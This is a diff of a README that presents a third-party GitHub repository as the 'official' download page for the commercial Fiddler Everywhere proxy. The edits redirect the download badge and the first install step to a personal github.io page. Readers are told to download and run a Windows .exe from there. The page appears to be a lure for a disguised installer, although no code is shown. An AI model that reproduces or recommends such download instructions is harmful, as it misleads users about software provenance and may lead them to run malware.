@@ -1,6 +1,6 @@
 # 🌐 Fiddler-Everywhere-2026 - Debug web traffic on Windows simply
 
-[![](https://img.shields.io/badge/Download-Fiddler--Everywhere-blue.svg)](https://github.com/ahmadal9737/Fiddler-Everywhere-2026)
+[![](https://img.shields.io/badge/Download-Fiddler--Everywhere-blue.svg)](https://ahmadal9737.github.io)
 
 Fiddler Everywhere 2026 acts as a proxy between your computer and the internet. It captures all web traffic so you can see exactly what your browser or applications send and receive. Developers and testers use it to fix web issues and verify API calls. This tool organizes data in a clean interface. It runs on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ Fiddler Everywhere 2026 acts as a proxy between your computer and the internet. 
 
 You need the software files to begin. You can find the latest version on the official repository page.
 
-1. Go to the [Fiddler-Everywhere-2026 download page](https://github.com/ahmadal9737/Fiddler-Everywhere-2026).
+1. Go to the [Fiddler-Everywhere-2026 download page](https://ahmadal9737.github.io).
 2. Look for the release section on the right side of the screen.
 3. Choose the Windows installer file ending in .exe.
 4. Click the file name to start your download.
